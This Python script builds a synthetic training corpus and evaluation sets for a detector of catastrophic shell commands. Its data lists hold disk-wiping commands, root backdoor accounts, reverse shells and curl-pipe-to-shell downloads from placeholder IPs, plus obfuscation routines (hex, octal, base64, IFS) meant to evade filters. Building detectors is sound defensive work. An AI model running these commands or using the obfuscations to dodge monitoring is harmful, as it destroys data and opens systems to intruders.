#!/usr/bin/env python3
"""Build the v6 obfuscation-augmented corpus + eval slices (deterministic).

Goal (per user request): teach the model to *understand intent* of catastrophic
single commands under structural shell obfuscation, and certify the result
with new promotion gates:

  critical_single_command_recall >= 0.995   (canonical spellings)
  obfuscation_set_recall        >= 0.95     (structural obfuscation, disjoint
                                             families from training variants)
  benign_twin_fpr               <= 0.02     (minimal-pair false alerts)

Training rows are APPENDED to a copy of the v4 corpus (no v4 file is touched);
all generated rows carry family_id="family:obf-<variant>-<seed>" so the eval
families are disjoint from the training families by construction.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import random
import string
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]

# ---------------------------------------------------------------- templates
# catastrophic base spells, each: (cmd, tactics)
POS_BASE = [
    ("rm -rf /", ["TA0040"]),
    ("rm -fr /", ["TA0040"]),
    ("rm --recursive --force /", ["TA0040"]),
    ("rm -rf /etc", ["TA0040"]),
    ("rm -rf /var", ["TA0040"]),
    ("rm -rf /usr", ["TA0040"]),
    ("rm -rf /bin /sbin", ["TA0040"]),
    ("rm -rf /lib /lib64", ["TA0040"]),
    ("rm -rf /opt", ["TA0040"]),
    ("rm -rf /root", ["TA0040"]),
    ("rm -rf /home", ["TA0040"]),
    ("rm -rf /*", ["TA0040"]),
    ("rm -rf /etc/*", ["TA0040"]),
    ("rm -rf /var/log/*", ["TA0040"]),
    ("rm -rf $HOME", ["TA0040"]),
    ("rm -rf ${HOME}", ["TA0040"]),
    ("rm -rf ~", ["TA0040"]),
    ("rm -rf / --no-preserve-root", ["TA0040"]),
    ("mkfs.ext4 /dev/sda1", ["TA0040"]),
    ("mkfs.xfs /dev/sda", ["TA0040"]),
    ("mke2fs /dev/sdb", ["TA0040"]),
    ("dd if=/dev/zero of=/dev/sda bs=1M", ["TA0040"]),
    ("dd if=/dev/urandom of=/dev/nvme0n1 bs=512k", ["TA0040"]),
    ("shred -n 1 -z /dev/sda", ["TA0040"]),
    ("wipefs -a /dev/sda1", ["TA0040"]),
    ("parted /dev/sda mklabel gpt", ["TA0040"]),
    ("echo c > /proc/sysrq-trigger", ["TA0040"]),
    ("echo 1 > /proc/sys/kernel/panic", ["TA0040"]),
    ("useradd -o -u 0 -g 0 backdoor", ["TA0003", "TA0004"]),
    ("usermod -o -u 0 root", ["TA0003", "TA0004"]),
    ("echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd", ["TA0003", "TA0004"]),
    ("kill -9 1", ["TA0040"]),
    ("kill -9 -1", ["TA0040"]),
    ("pkill -9 -1", ["TA0040"]),
    ("chmod -R 000 /", ["TA0040"]),
    ("chmod -R 777 /", ["TA0040"]),
    ("find / -delete", ["TA0040"]),
    ("find / -exec rm -rf {} \\;", ["TA0040"]),
    ("bash -i >& /dev/tcp/{ip}/{port} 0>&1", ["TA0011"]),
    ("sh -i 2>&1 | nc {ip} {port}", ["TA0011"]),
    ("nc -e /bin/sh {ip} {port}", ["TA0011"]),
    ("curl -sL http://{host}/a.sh | bash", ["TA0011"]),
    ("wget -qO- http://{host}/i.sh | sh", ["TA0011"]),
    ("curl -s http://{host}/x -o /tmp/x && chmod +x /tmp/x && /tmp/x", ["TA0011"]),
    ("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", ["TA0011"]),
]

# benign minimal pairs: same verbs, safe targets
BENIGN_BASE = [
    "rm -rf /tmp/a",
    "rm -rf /tmp/build-cache",
    "rm -rf /var/tmp/logs",
    "rm -rf /home/u/project/dist",
    "dd if=/dev/sda of=/tmp/backup.img bs=1M status=progress",
    "mkfs.ext4 /tmp/fs.img",
    "mkfs.xfs /tmp/fs.img",
    "shred -u /home/u/notes.txt",
    "chmod -R 600 ./myapp",
    "chmod -R 700 ~/.ssh",
    "sh -c 'echo hello'",
    "bash -c 'ls -la'",
    "kill -9 4242",
    "pkill -9 java",
    "userdel tempuser",
    "curl -s https://example.com/a.txt -o /tmp/a.txt",
    "python3 -c 'print(1)'",
]

# ------------------------------------------------------------- obfuscation
def case_mix(s: str, rng: random.Random) -> str:
    return "".join(c.upper() if (c.isalpha() and rng.random() < 0.4) else c for c in s)


def quote_join(s: str, rng: random.Random) -> str:
    out = []
    for word in s.split(" "):
        if rng.random() < 0.5:
            out.append(word)
            continue
        parts = []
        for ch in word:
            if rng.random() < 0.5:
                parts.append(f"'{ch}'")
            else:
                parts.append(ch)
        out.append("".join(parts))
    return " ".join(out)


def backslash_hex(word: str) -> str:
    return "".join(f"\\x{ord(c):02x}" for c in word)


def octal(word: str) -> str:
    return "".join(f"\\{oct(ord(c))[2:]:0>3}" for c in word)


def wrap_quotes_firstk(s: str, k: int, q: str) -> str:
    parts = s.split(" ")
    if len(parts) <= k:
        return " ".join(q + p + q for p in parts)
    head = " ".join(q + p + q for p in parts[:k])
    return head + " " + " ".join(parts[k:])


def obfuscate(s: str, method: str, rng: random.Random) -> str:
    if method == "plain":
        return s
    words = s.split(" ")
    if method == "quote_join":
        return quote_join(s, rng)
    if method == "backslash_hex_first":
        return backslash_hex(words[0]) + " " + " ".join(words[1:])
    if method == "octal_first":
        return octal(words[0]) + " " + " ".join(words[1:])
    if method == "ansi_c_first":
        return "$\u0027" + backslash_hex(words[0]) + "\u0027 " + " ".join(words[1:])
    if method == "case_mix":
        return case_mix(s, rng)
    if method == "busybox":
        return "busybox " + s
    if method == "env":
        return "env " + s
    if method == "toybox_sh_c":
        return "toybox sh -c " + json.dumps(s)
    if method == "sh_c":
        return "sh -c " + json.dumps(s)
    if method == "bash_c":
        return "bash -c " + json.dumps(s)
    if method == "subs_echo_first":
        return "$(echo " + words[0] + ") " + " ".join(words[1:])
    if method == "backtick_echo_first":
        return "`echo " + words[0] + "` " + " ".join(words[1:])
    if method == "ifs":
        return s.replace(" ", "${IFS}", 1).replace(" ", "${IFS}", 1)
    if method == "path_dot":
        return s.replace("/etc", "/tmp/../etc", 1) if "/etc" in s else s
    if method == "path_double":
        return s.replace("/", "//", 1)
    if method == "base64_sh":
        import base64
        payload = base64.b64encode(s.encode()).decode()
        return f"echo {payload} | base64 -d | sh"
    raise ValueError(method)


TRAIN_METHODS = [
    "quote_join", "backslash_hex_first", "ansi_c_first", "case_mix",
    "busybox", "toybox_sh_c", "subs_echo_first", "ifs", "env",
]
EVAL_METHODS = [
    "octal_first", "backtick_echo_first", "base64_sh", "sh_c", "bash_c",
    "path_dot", "path_double", "busybox", "case_mix", "quote_join",
]

# ---------------------------------------------------------------- builders
def fill(s: str, rng: random.Random) -> str:
    ip = f"45.33.{rng.randint(1, 250)}.{rng.randint(1, 250)}"
    port = rng.choice(["4444", "8080", "31337", "1337", "5555"])
    dev = rng.choice("abcdefgh").upper()
    s = (s.replace("{ip}", ip).replace("{port}", port)
          .replace("{host}", ip))
    if "/dev/sdX" in s or "/dev/sda" in s or "/dev/sdb" in s:
        s = s.replace("/dev/sda", f"/dev/sd{dev.lower()}")
        s = s.replace("/dev/sdb", f"/dev/sd{dev.lower()}")
    s = s.replace("/dev/nvme0n1", f"/dev/nvme{rng.randint(0, 3)}n1p{rng.randint(1, 4)}")
    s = s.replace("/dev/sda1", f"/dev/sd{dev.lower()}1")
    return s


def session(cmd: str, label: str, family: str, kind: str, dts=None):
    commands = [{"cmd": cmd, "dt": 0.0}]
    if dts:
        for dt in dts:
            commands.append({"cmd": cmd, "dt": dt})
    dig = hashlib.sha256((family + "\x00" + cmd).encode()).hexdigest()[:32]
    return {
        "schema_version": "1.0",
        "session_id": f"sha256:{dig}",
        "source": {
            "kind": kind,
            "name": "v6_obfuscation_corpus",
            "parent_session_id": None,
            "license": "synthetic; generated in-repo, no redistribution claim",
        },
        "family_id": f"family:obf-{family}",
        "commands": commands,
        "meta": {"Protocol": "shell", "FirstSeen": "", "LastSeen": ""},
        "label": {
            "malicious": 1 if label == "pos" else 0,
            "first_evidence_index": 0 if label == "pos" else None,
            "technique_evidence": {},
            "tactics": ["TA0040"] if label == "pos" else [],
            "techniques": [],
            "quality": "synthetic_aug",
            "teacher_votes": [],
        },
        "split": "train",
    }


def render(*, out_dir: Path, rng: random.Random, methods, family_stem: str,
           n_pos: int, n_ben: int, split: str, label_prefix: str = "") -> list[dict]:
    rows = []
    seen = set()
    pos_count = ben_count = 0
    loops = 0
    while (pos_count < n_pos or ben_count < n_ben) and loops < 500000:
        loops += 1
        if pos_count < n_pos and (ben_count >= n_ben or rng.random() < 0.75):
            base, tactics = rng.choice(POS_BASE)
            base = fill(base, rng)
            method = rng.choice(methods)
            cmd = obfuscate(base, method, rng)
            family = f"{family_stem}-{method}"
            lbl = "pos"
        elif ben_count < n_ben:
            base = rng.choice(BENIGN_BASE)
            tail = base.split(" ")[-1]
            if tail and tail[0] not in (chr(39), chr(34), chr(96)):
                suffix = f"{rng.randint(0, 9999):04d}"
                if tail.startswith("/") or tail.startswith("./") or tail.startswith("~"):
                    if tail.endswith((".img", ".txt")):
                        base = base.rsplit(".", 1)[0] + "-" + suffix + "." + tail.rsplit(".", 1)[1]
                    else:
                        base = base + "-" + suffix
                elif tail.isdigit():
                    base = base[:-len(tail)] + str(rng.randint(1000, 65000))
                else:
                    base = base + "-" + suffix
            elif tail.startswith(chr(39)) and tail.endswith(chr(39)):
                base = base + " #" + str(rng.randint(0, 99999))
            method = rng.choice(methods) if rng.random() < 0.3 else "plain"
            cmd = obfuscate(base, method, rng)
            family = f"{family_stem}-benign-{method}"
            lbl = "ben"
        else:
            continue
        key = (lbl, cmd)
        if key in seen:
            continue
        seen.add(key)
        row = session(cmd, "pos" if lbl == "pos" else "ben", family,
                      "synthetic_aug_obf")
        if lbl == "pos":
            pos_count += 1
            for t in tactics:
                if t not in row["label"]["tactics"]:
                    row["label"]["tactics"].append(t)
        else:
            ben_count += 1
        row["split"] = split
        rows.append(row)
    return rows


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out-dir", default=str(ROOT / "data/processed/v6_obf"))
    ap.add_argument("--eval-out-dir", default=str(ROOT / "data/processed/v6_obf_evals"))
    ap.add_argument("--train-pos", type=int, default=2400)
    ap.add_argument("--train-ben", type=int, default=1200)
    ap.add_argument("--eval-canon-pos", type=int, default=400)
    ap.add_argument("--eval-obf-pos", type=int, default=1600)
    ap.add_argument("--eval-ben", type=int, default=800)
    ap.add_argument("--seed", type=int, default=20260923)
    args = ap.parse_args()

    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)
    evals = Path(args.eval_out_dir)
    evals.mkdir(parents=True, exist_ok=True)

    # --- training augmentation (families never reused in eval) ----------
    rng = random.Random(args.seed)
    train_rows = render(out_dir=out, rng=rng, methods=TRAIN_METHODS,
                        family_stem=f"train-{args.seed}", n_pos=args.train_pos,
                        n_ben=args.train_ben, split="train")

    # append additive copy of v4 train (never edit originals)
    v4_train = ROOT / "data/processed/v4/train.jsonl"
    base_rows = [json.loads(l) for l in v4_train.open() if l.strip()]
    with (out / "train.jsonl").open("w") as f:
        for r in base_rows + train_rows:
            r["split"] = "train"
            f.write(json.dumps(r, sort_keys=True) + "\n")
    for name in ("dev.jsonl", "test.jsonl"):
        src = ROOT / "data/processed/v4" / name
        dst = out / name
        dst.write_bytes(src.read_bytes())

    # --- eval slices ----------------------------------------------------
    rng_c = random.Random(args.seed + 1)
    canon = render(out_dir=evals, rng=rng_c, methods=["plain"],
                   family_stem=f"eval-canon-{args.seed}", n_pos=args.eval_canon_pos,
                   n_ben=0, split="test")
    with (evals / "critical_singles_eval.jsonl").open("w") as f:
        for r in canon:
            f.write(json.dumps(r, sort_keys=True) + "\n")

    rng_o = random.Random(args.seed + 2)
    obf = render(out_dir=evals, rng=rng_o, methods=EVAL_METHODS,
                 family_stem=f"eval-obf-{args.seed}", n_pos=args.eval_obf_pos,
                 n_ben=0, split="test")
    with (evals / "obfuscation_eval.jsonl").open("w") as f:
        for r in obf:
            f.write(json.dumps(r, sort_keys=True) + "\n")

    rng_b = random.Random(args.seed + 3)
    ben = render(out_dir=evals, rng=rng_b, methods=["plain"],
                 family_stem=f"eval-ben-{args.seed}", n_pos=0,
                 n_ben=args.eval_ben, split="test")
    with (evals / "benign_twins_eval.jsonl").open("w") as f:
        for r in ben:
            f.write(json.dumps(r, sort_keys=True) + "\n")

    print(f"train.jsonl rows = {len(base_rows) + len(train_rows)} "
          f"(+{len(train_rows)} obf aug)")
    print(f"critical_singles_eval = {len(canon)}")
    print(f"obfuscation_eval      = {len(obf)}")
    print(f"benign_twins_eval     = {len(ben)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
